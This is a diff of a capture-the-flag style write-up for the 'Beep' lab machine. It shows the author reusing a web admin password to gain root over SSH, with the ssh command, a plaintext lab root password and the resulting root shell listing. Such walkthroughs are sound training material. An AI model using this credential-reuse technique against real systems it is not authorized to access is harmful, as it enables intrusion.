@@ -147,19 +147,25 @@ Now let's try to login into the admin panel in `/admin`, which we could not acce
 At this point I was curious if they used the password for EVERYTHING. So I tried to connect to ssh with root! And it worked! I got a root shell! 
 
 ```
-└──╼ $ ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.129.1.226
-root@10.129.1.226's password: 
-Last login: Tue Sep 29 12:10:12 2020
+┌─[puck@parrot-lt]─[~/htb/beep]
+└──╼ $ssh -o KexAlgorithms=diffie-hellman-group14-sha1 root@10.10.10.7
+root@10.10.10.7's password: 
+Permission denied, please try again.
+root@10.10.10.7's password: jEhdIekWmdjE
+Last login: Tue Jul 16 11:45:47 2019
 
 Welcome to Elastix 
 ----------------------------------------------------
 
 To access your Elastix System, using a separate workstation (PC/MAC/Linux)
 Open the Internet Browser using the following URL:
-http://10.129.1.226
+http://10.10.10.7
 
-[root@beep ~]# id
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+[root@beep ~]# ls
+anaconda-ks.cfg		   install.log.syslog  webmin-1.570-1.noarch.rpm
+elastix-pr-2.2-1.i386.rpm  postnochroot
+install.log		   root.txt
+[root@beep ~]# 
 ```
 
 ### FreePBX
